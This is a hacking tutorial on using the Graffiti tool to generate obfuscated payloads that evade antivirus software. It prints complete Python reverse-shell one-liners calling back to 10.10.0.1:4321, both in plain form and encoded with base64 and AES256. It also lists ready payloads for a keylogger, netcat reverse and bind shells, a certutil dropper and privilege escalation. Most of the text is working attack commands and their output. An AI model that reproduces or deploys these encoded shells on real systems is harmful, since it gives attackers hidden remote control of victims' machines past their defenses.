# Bypass AV Software by Obfuscating Your Payloads

It's exciting to get that reverse shell or execute a payload, but sometimes these things don't work as expected when there are certain defenses in play. One way to get around that issue is by obfuscating the payload, and encoding it using different techniques will usually bring varying degrees of success. Graffiti can make that happen.

Graffiti is a tool that can [generate obfuscated payloads](https://null-byte.wonderhowto.com/how-to/use-msfconsoles-generate-command-obfuscate-payloads-evade-antivirus-detection-0187686/) using a variety of different encoding techniques. It offers an array of one-liners and shells in languages such as [Python](https://null-byte.wonderhowto.com/how-to/hacks-mr-robot-use-shodan-api-with-python-automate-scans-for-vulnerable-devices-0180975/), Perl, [PHP](https://null-byte.wonderhowto.com/how-to/slip-backdoor-into-php-websites-with-weevely-0175211/), Batch, [PowerShell](https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/), and Bash. Payloads can be encoded using base64, hex, and AES256, among others. It also features two modes of operation: command-line mode and interactive mode.

Other useful features of Graffiti include the ability to create your own payload files, terminal history, option to run native OS commands, and tab-completion in interactive mode. Graffiti should work out of the box on [Linux](https://null-byte.wonderhowto.com/how-to/linux-basics/), [Mac](https://null-byte.wonderhowto.com/collection/mac-for-hackers/), and [Windows](https://null-byte.wonderhowto.com/collection/hacking-windows-ten/), and it can be installed to the system as an executable on both Linux and Mac. We will be using [Kali Linux](https://null-byte.wonderhowto.com/how-to/top-10-things-do-after-installing-kali-linux-0186450/) to explore the tool below.

### Setup & Installation <a href="#jump-setupampinstallation" id="jump-setupampinstallation"></a>

To get started, let's clone into the [GitHub repo for Graffiti](https://github.com/Ekultek/Graffiti) using the **git** command:

```
~# git clone https://github.com/Ekultek/Graffiti

Cloning into 'Graffiti'...
remote: Enumerating objects: 212, done.
remote: Total 212 (delta 0), reused 0 (delta 0), pack-reused 212
Receiving objects: 100% (212/212), 41.27 KiB | 768.00 KiB/s, done.
Resolving deltas: 100% (108/108), done.
```

Next, change into the new directory:

```
~# cd Graffiti/
```

And list the contents to verify everything is there:

```
~/Graffiti# ls

coders  conf.json  etc  graffiti.py  install.sh  lib  main  README.md
```

We can run the tool with the **python** command — let's see the help menu by tacking on the **-h** switch:

```
~/Graffiti# python graffiti.py -h

usage: graffiti.py [-h] [-c CODEC] [-p PAYLOAD]
                   [--create PAYLOAD SCRIPT-TYPE PAYLOAD-TYPE DESCRIPTION OS]
                   [-l]
                   [-P [PAYLOAD [SCRIPT-TYPE,PAYLOAD-TYPE,DESCRIPTION ...]]]
                   [-lH LISTENING-ADDRESS] [-lP LISTENING-PORT] [-u URL] [-vC]
                   [-H] [-W] [--memory] [-mC COMMAND [COMMAND ...]] [-Vc]

optional arguments:
  -h, --help            show this help message and exit
  -c CODEC, --codec CODEC
                        specify an encoding technique (*default=None)
  -p PAYLOAD, --payload PAYLOAD
                        pass the path to a payload to use (*default=None)
  --create PAYLOAD SCRIPT-TYPE PAYLOAD-TYPE DESCRIPTION OS
                        create a payload file and store it inside of
                        ./etc/payloads (*default=None)
  -l, --list            list all available payloads by path (*default=False)
  -P [PAYLOAD [SCRIPT-TYPE,PAYLOAD-TYPE,DESCRIPTION ...]], --personal-payload [PAYLOAD [SCRIPT-TYPE,PAYLOAD-TYPE,DESCRIPTION ...]]
                        pass your own personal payload to use for the encoding
                        (*default=None)
  -lH LISTENING-ADDRESS, --lhost LISTENING-ADDRESS
                        pass a listening address to use for the payload (if
                        needed) (*default=None)
  -lP LISTENING-PORT, --lport LISTENING-PORT
                        pass a listening port to use for the payload (if
                        needed) (*default=None)
  -u URL, --url URL     pass a URL if needed by your payload (*default=None)
  -vC, --view-cached    view the cached data already present inside of the
                        database
  -H, --no-history      do not store the command history (*default=True)
  -W, --wipe            wipe the database and the history (*default=False)
  --memory              initialize the database into memory instead of a .db
                        file (*default=False)
  -mC COMMAND [COMMAND ...], --more-commands COMMAND [COMMAND ...]
                        pass more external commands, this will allow them to
                        be accessed inside of the terminal commands must be in
                        your PATH (*default=None)
  -Vc, --view-codecs    view the current available encoding codecs and their
                        compatible languages
```

Here, we get its usage information and optional arguments that are available.

An easier way to use Graffiti is to install it onto the system. That way, we don't need to be in the directory to run it — it can be executed from anywhere. Simply launch the install script to begin:

```
~/Graffiti# ./install.sh

starting file copying..
creating executable
editing file stats
installed, you need to run: source ~/.bash_profile
```

It tells us we need to run the **source** command on our bash profile to complete the installation — the source command basically loads any functions in the current shell:

```
~/Graffiti# source ~/.bash_profile
```

Now we should be able to run the tool from anywhere by typing **graffiti** in the terminal:

```
~# graffiti -h

usage: graffiti.py [-h] [-c CODEC] [-p PAYLOAD]
                   [--create PAYLOAD SCRIPT-TYPE PAYLOAD-TYPE DESCRIPTION OS]
                   [-l]
                   [-P [PAYLOAD [SCRIPT-TYPE,PAYLOAD-TYPE,DESCRIPTION ...]]]
                   [-lH LISTENING-ADDRESS] [-lP LISTENING-PORT] [-u URL] [-vC]
                   [-H] [-W] [--memory] [-mC COMMAND [COMMAND ...]] [-Vc]

optional arguments:
  -h, --help            show this help message and exit
  -c CODEC, --codec CODEC
                        specify an encoding technique (*default=None)
  -p PAYLOAD, --payload PAYLOAD
                        pass the path to a payload to use (*default=None)
  --create PAYLOAD SCRIPT-TYPE PAYLOAD-TYPE DESCRIPTION OS
                        create a payload file and store it inside of
                        ./etc/payloads (*default=None)
  -l, --list            list all available payloads by path (*default=False)
  -P [PAYLOAD [SCRIPT-TYPE,PAYLOAD-TYPE,DESCRIPTION ...]], --personal-payload [PAYLOAD [SCRIPT-TYPE,PAYLOAD-TYPE,DESCRIPTION ...]]
                        pass your own personal payload to use for the encoding
                        (*default=None)
  -lH LISTENING-ADDRESS, --lhost LISTENING-ADDRESS
                        pass a listening address to use for the payload (if
                        needed) (*default=None)
  -lP LISTENING-PORT, --lport LISTENING-PORT
                        pass a listening port to use for the payload (if
                        needed) (*default=None)
  -u URL, --url URL     pass a URL if needed by your payload (*default=None)
  -vC, --view-cached    view the cached data already present inside of the
                        database
  -H, --no-history      do not store the command history (*default=True)
  -W, --wipe            wipe the database and the history (*default=False)
  --memory              initialize the database into memory instead of a .db
                        file (*default=False)
  -mC COMMAND [COMMAND ...], --more-commands COMMAND [COMMAND ...]
                        pass more external commands, this will allow them to
                        be accessed inside of the terminal commands must be in
                        your PATH (*default=None)
  -Vc, --view-codecs    view the current available encoding codecs and their
                        compatible languages
```

### Option 1: Use Graffiti in Command-Line Mode <a href="#jump-option1usegraffitiincommandlinemode" id="jump-option1usegraffitiincommandlinemode"></a>

The first way to run Graffiti is in normal command-line mode. All we have to do is pass the arguments after the command, just like you would with any other tool or script. For example, we can list all available [payloads](https://null-byte.wonderhowto.com/how-to/hacking-macos-hide-payloads-inside-photo-metadata-0196815/) with the **-l** switch:

```
~# graffiti -l

Windows payloads:

/windows/batch/nc_bind.json
/windows/batch/certutil_exe.json
/windows/batch/nc_reverse.json
/windows/batch/sync_appv.json
/windows/python/socket_reverse.json
/windows/powershell/keylogger.json
/windows/powershell/escalate_service.json
/windows/powershell/meterpreter_shell.json
/windows/powershell/cleartext_wifi.json
/windows/perl/socket_reverse.json
/windows/ruby/socket_reverse.json

Linux payloads:

/linux/python/socket_reverse.json
/linux/php/socket_reverse.json
/linux/perl/socket_reverse.json
/linux/ruby/socket_reverse.json
/linux/bash/subdomain_enum_crt.json
/linux/bash/netcat_reverse.json
/linux/bash/download_linux_exploit_suggester.json
/linux/bash/pipe_reverse.json
/linux/bash/subdomain_enum_archive.json
/linux/bash/suid.json
/linux/bash/download_checkers.json
/linux/bash/netcat_binder.json
/linux/bash/download_nmap_scripts.json
/linux/bash/download_linux_priv_checker.json
/linux/bash/bash_reverse.json
```

We can see there are options for [Netcat shells](https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-netcat-swiss-army-knife-hacking-tools-0148657/), Python shells, and many others, separated between Windows and Linux.

We can use the **-Vc** option to view the available encoders and the corresponding languages they're available for:

```
~# graffiti -Vc

CODEC:      ACCEPTABLE:
aes256      python
atbash      python
xor     php,python
base64      powershell,php,python,perl,ruby,bash,batch
hex     powershell,php,python,perl,ruby,bash,batch
raw     powershell,php,python,perl,ruby,bash,batch
rot13       python,ruby,php
```

The **-p** switch is the bread and butter of Graffiti — use it to specify a payload, followed by **-c** to specify the encoding technique, and finally **-lH** and **-lP** to set the listening address and port, respectively. Here is a Python reverse shell in raw format, meaning no encoding:

```
~# graffiti -p /linux/python/socket_reverse.json -c raw -lH 10.10.0.1 -lP 4321

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.1",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

That will spit out the command for the appropriate [reverse shell](https://null-byte.wonderhowto.com/how-to/use-command-injection-pop-reverse-shell-web-server-0185760/) with all the information filled in. All we need to do at this point is copy and paste.

Let's try another example. Here is that same Python reverse shell encoded in base64:

```
~# graffiti -p /linux/python/socket_reverse.json -c base64 -lH 10.10.0.1 -lP 4321

python -c 'exec("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjAuMSIsNDMyMSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7".decode("base64"))'
```

And again, this time using the AES256 cipher:

```
~# graffiti -p /linux/python/socket_reverse.json -c aes256 -lH 10.10.0.1 -lP 4321

# be sure that the target has PyCrypto on their system!
python -c 'import base64;from Crypto import Random;from Crypto.Cipher import AES;from Crypto.Util import Counter;ct=base64.b64decode("7mC355qybpwkZRVMOGKbHBNqNKFwVbBcpgBZ0cwQlNT6sAF3YwLN9DmIFph4GCRHFVEghR8xTeWIulP3MOpPAI869iFn5FzX3Y32m9tGqiVzvL0tO0NTU2gQXTAauni+8p0+Au/fxjgX8AwpuJOl7lIPFxVHTk/zRLu0mg257OknhKgJxuQgUM5SrXG+XJcg1BRohs0AHJSGjLQs0oqfBxV4WPLLMVQHP76DJHTndgakXf0cHhbkJa+J6umbjMaG+6ZbJSz/7SQo+9XWzTGNU5w80/KP");dk=base64.b64decode("gGhVa2B/DPmOp1tfIL2AhdyVyTapvpgtkCLFZ4WL0OU=");iv=base64.b64decode("VSUepHglfitT7q08vuekMA==");ivi=int(iv.encode("hex"),16);co=Counter.new(AES.block_size*8,initial_value=ivi);a=AES.new(dk,AES.MODE_CBC,counter=co);r=a.decrypt(ct);exec(str(r))'
```

Instead of going back and running these commands again, Graffiti keeps a cache of payloads for easy access — use the **-vC** option to see them:

```
~# graffiti -vC

total of 3 payloads present

Language: python
Payload Type: reverse
Payload: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.1",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Language: python
Payload Type: reverse
Payload: python -c 'exec("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjAuMSIsNDMyMSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7".decode("base64"))'

Language: python
Payload Type: reverse
Payload: python -c 'import base64;from Crypto import Random;from Crypto.Cipher import AES;from Crypto.Util import Counter;ct=base64.b64decode("7mC355qybpwkZRVMOGKbHBNqNKFwVbBcpgBZ0cwQlNT6sAF3YwLN9DmIFph4GCRHFVEghR8xTeWIulP3MOpPAI869iFn5FzX3Y32m9tGqiVzvL0tO0NTU2gQXTAauni+8p0+Au/fxjgX8AwpuJOl7lIPFxVHTk/zRLu0mg257OknhKgJxuQgUM5SrXG+XJcg1BRohs0AHJSGjLQs0oqfBxV4WPLLMVQHP76DJHTndgakXf0cHhbkJa+J6umbjMaG+6ZbJSz/7SQo+9XWzTGNU5w80/KP");dk=base64.b64decode("gGhVa2B/DPmOp1tfIL2AhdyVyTapvpgtkCLFZ4WL0OU=");iv=base64.b64decode("VSUepHglfitT7q08vuekMA==");ivi=int(iv.encode("hex"),16);co=Counter.new(AES.block_size*8,initial_value=ivi);a=AES.new(dk,AES.MODE_CBC,counter=co);r=a.decrypt(ct);exec(str(r))'
```

We can also wipe the history with the **-W** switch:

```
~# graffiti -W

wiping the database and the history files
database and history files wiped
```

### Option 2: Use Graffiti in Interactive Mode <a href="#jump-option2usegraffitiininteractivemode" id="jump-option2usegraffitiininteractivemode"></a>

The other way to run Graffiti is in its interactive mode, which comes with a built-in terminal environment. Simply run the tool without any arguments to drop in:

```
~# graffiti

  ________              _____  _____.__  __  .__
 /  _____/___________ _/ ____\/ ____\__|/  |_|__|
/   \  __\_  __ \__  \\   __\\   __\|  \   __\  |
\    \_\  \  | \// __ \|  |   |  |  |  ||  | |  |
 \______  /__|  (____  /__|   |__|  |__||__| |__|
        \/           \/
 v(0.0.10)

no arguments have been passed, dropping into terminal type `help/?` to get help, all commands that sit inside of `/bin` are available in the terminal
Traceback (most recent call last):
  File "graffiti.py", line 5, in <module>
    main()
  File "/root/.graffiti/.install/etc/main/main.py", line 10, in main
    Parser().single_run_args(parsed_config, cursor)
  File "/root/.graffiti/.install/etc/lib/arguments.py", line 182, in single_run_args
    ).do_start(conf["graffiti"]["saveCommandHistory"])
  File "/root/.graffiti/.install/etc/lib/terminal_display.py", line 290, in do_start
    self.reflect_memory()
  File "/root/.graffiti/.install/etc/lib/terminal_display.py", line 77, in reflect_memory
    with open(self.full_history_file_path) as history:
IOError: [Errno 2] No such file or directory: '/root/.graffiti/.install/etc/.history/2019-11-14/graffiti.history'
```

If you receive the error above, all you have to do is create a new history file in the appropriate directory — use the **touch** command like so:

```
~# touch .graffiti/.install/etc/.history/2019-11-14/graffiti.history
```

Now when we run it, we successfully enter the interactive mode, which will come with its own prompt:

```
~# graffiti

  ________              _____  _____.__  __  .__
 /  _____/___________ _/ ____\/ ____\__|/  |_|__|
/   \  __\_  __ \__  \\   __\\   __\|  \   __\  |
\    \_\  \  | \// __ \|  |   |  |  |  ||  | |  |
 \______  /__|  (____  /__|   |__|  |__||__| |__|
        \/           \/
 v(0.0.10)

no arguments have been passed, dropping into terminal type `help/?` to get help, all commands that sit inside of `/bin` are available in the terminal
root@graffiti:~/graffiti#
```

To see the help menu, type **help** or **?** at the prompt:

```
root@graffiti:~/graffiti# ?

 Command                                  Description
---------                                --------------
 help/?                                  Show this help
 external                                List available external commands
 cached/stored                           Display all payloads that are already in the database
 list/show                               List all available payloads
 search <phrase>                         Search for a specific payload
 use <payload> <coder>                   Use this payload and encode it using a specified coder
 info                                    Get information on all the payloads
 check                                   Check for updates
 history/mem[ory]                        Display command history
 exit/quit                               Exit the terminal and running session
 encode <script-type> <coder>            Encode a provided payload
 check                                   Check for updates
```

We can check if we have the latest version of the tool by running the **check** command:

```
root@graffiti:~/graffiti# check

From https://github.com/Ekultek/Graffiti
 * branch            master     -> FETCH_HEAD
Already up to date.
```

It's also useful to know what [external commands](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/) we have available to us, so we don't need to exit interactive mode or switch to a new tab to run the usual commands. Use the **external** command to view a list of these:

```
root@graffiti:~/graffiti# external

busybox nc bzdiff zsh5 uname kill networkctl touch systemd-notify hashcat udevadm systemd bzfgrep tempfile ls bzcat goscan vdir df rzsh dd cpio ulockmgr_server systemctl rbash grep bzexe ntfssecaudit dirsearch findmnt zcmp umount nisdomainname sleep ntfsinfo kbd_mode dir systemd-inhibit sync ifconfig zforce mknod sed systemd-hwdb mountpoint znew mktemp kmod rsync fgconsole nano loginctl chvt systemd-ask-password ntfsrecover lowntfs-3g run-parts rm systemd-tmpfiles dnsdomainname gzexe uncompress ping4 keyctl ping6 netstat journalctl ntfsfix bzmore ntfscat bash zmore ntfsmove pidof bzgrep zdiff systemd-escape ln systemd-sysusers ypdomainname zegrep login ntfstruncate ntfscluster lsblk nmap chmod echo ntfs-3g wdctl cp sh.distrib usleep ps fusermount mkdir bzcmp mt-gnu fuser rmdir vi zless more lsmod openvt setupcon telnet ntfs-3g.probe bunzip2 pwd ntfswipe true systemd-tty-ask-password-agent zcat stty setfacl mount cat mt plymouth mv bzip2recover bzegrep zsh false tar domainname ip dash getfacl hciconfig setfont zgrep systemd-machine-id-setup bzip2 egrep chacl nc.traditional hostname ping zfgrep chgrp python find fgrep which ntfsfallocate ntfscmp unicode_start ftp bzless readlink date netcat gunzip loadkeys dmesg dumpkeys ss sendprobe clear su ntfsusermap chown sh rnano gzip ntfsls ssh
```

For instance, we can run a command like **uname -a** directly from Graffiti's interactive prompt:

```
root@graffiti:~/graffiti# uname -a

Linux drd 5.2.0-kali3-amd64 #1 SMP Debian 5.2.17-1kali2 (2019-10-17) x86_64 GNU/Linux
```

The **list** command will show all the available payloads, much like the **-l** switch from before:

```
root@graffiti:~/graffiti# list

/windows/batch/nc_bind.json
/windows/batch/certutil_exe.json
/windows/batch/nc_reverse.json
/windows/batch/sync_appv.json
/windows/python/socket_reverse.json
/windows/powershell/keylogger.json
/windows/powershell/escalate_service.json
/windows/powershell/meterpreter_shell.json
/windows/powershell/cleartext_wifi.json
/windows/perl/socket_reverse.json
/windows/ruby/socket_reverse.json
/linux/python/socket_reverse.json
/linux/php/socket_reverse.json
/linux/perl/socket_reverse.json
/linux/ruby/socket_reverse.json
/linux/bash/subdomain_enum_crt.json
/linux/bash/netcat_reverse.json
/linux/bash/download_linux_exploit_suggester.json
/linux/bash/pipe_reverse.json
/linux/bash/subdomain_enum_archive.json
/linux/bash/suid.json
/linux/bash/download_checkers.json
/linux/bash/netcat_binder.json
/linux/bash/download_nmap_scripts.json
/linux/bash/download_linux_priv_checker.json
/linux/bash/bash_reverse.json
```

We can also get information about the payloads with the **info** command. Unfortunately, it doesn't allow us to single out a payload, instead, listing all of them at once:

```
root@graffiti:~/graffiti# info

Script type: batch
Execution type: bind
Information: uses Windows netcat to start a bindshell
Full path: /root/.graffiti/.install/etc/etc/payloads/windows/batch/nc_bind.json

Script type: batch
Execution type: dropper
Information: uses certutil to download a file without causing suspicion
Full path: /root/.graffiti/.install/etc/etc/payloads/windows/batch/certutil_exe.json

Script type: batch
Execution type: reverse
Information: uses netcat to start a reverse shell
Full path: /root/.graffiti/.install/etc/etc/payloads/windows/batch/nc_reverse.json

Script type: batch
Execution type: dropper
Information: uses Microsoft SyncAppvPublishingServer to download and execute a powershell file
Full path: /root/.graffiti/.install/etc/etc/payloads/windows/batch/sync_appv.json

Script type: python
Execution type: reverse
Information: uses python socket library to connect back and execute commands with subprocess
Full path: /root/.graffiti/.install/etc/etc/payloads/windows/python/socket_reverse.json

Script type: powershell
Execution type: other
Information: creates a keylogger that stores in C:\Users\Public\key.log
Full path: /root/.graffiti/.install/etc/etc/payloads/windows/powershell/keylogger.json

...
```

To search for a specific payload, use the **search** command. For example, to search for Python payloads:

```
root@graffiti:~/graffiti# search python

found 2 relevant options:
------------------------------
/windows/python/socket_reverse.json
/linux/python/socket_reverse.json
```

We can create a payload with the **use** command, followed by the desired payload and the type of encoding to use:

```
root@graffiti:~/graffiti# use /linux/python/socket_reverse.json raw

enter the LHOST: 10.10.0.1
enter the LPORT: 4321
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.1",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

It will prompt us for the listening IP address and port, and it will display the command for the reverse shell when it's done.

Similar to Graffiti's command-line mode, we can view a history of cached payloads by using the **cached** command:

```
root@graffiti:~/graffiti# cached

Type: Reverse
Execution: Python
Payload: u'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.1",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
```

We can also display the command history with the **history** option:

```
root@graffiti:~/graffiti# history

   1   ?
   2   exit
   3   ?
   4   check
   5   external
   6   id
   7   uname
   8   uname -a
   9   ?
  10   list
  11   info
  12   list
  13   info /linux/python/socket_reverse.json
  14   ?
  15   info
  16   ?
  17   search python reverse
  18   search python
  19   use /linux/python/socket_reverse.json raw
  20   graffiti -h
  21   use /linux/python/socket_reverse.json xor
  22   ?
  23   cached
  24   history
```

Finally, to exit interactive mode, simply type **exit** at the prompt:

```
root@graffiti:~/graffiti# exit

saving current history to a file
exiting terminal
```

### Wrapping Up <a href="#jump-wrappingup" id="jump-wrappingup"></a>

In this tutorial, we learned how to use a tool called Graffiti to generate obfuscated payloads for use in penetration testing and hacking. First, we set up the tool and installed it onto our system for easy use. Next, we explored the command-line mode and some of the options it has available, including listing payloads, viewing history, and creating payloads encoded in a variety of techniques. We then took a look at the interactive mode and how it can easily be used to generate payloads, all from an interactive prompt.

Getting past defenses with obfuscated payloads has never been easier with Graffiti.
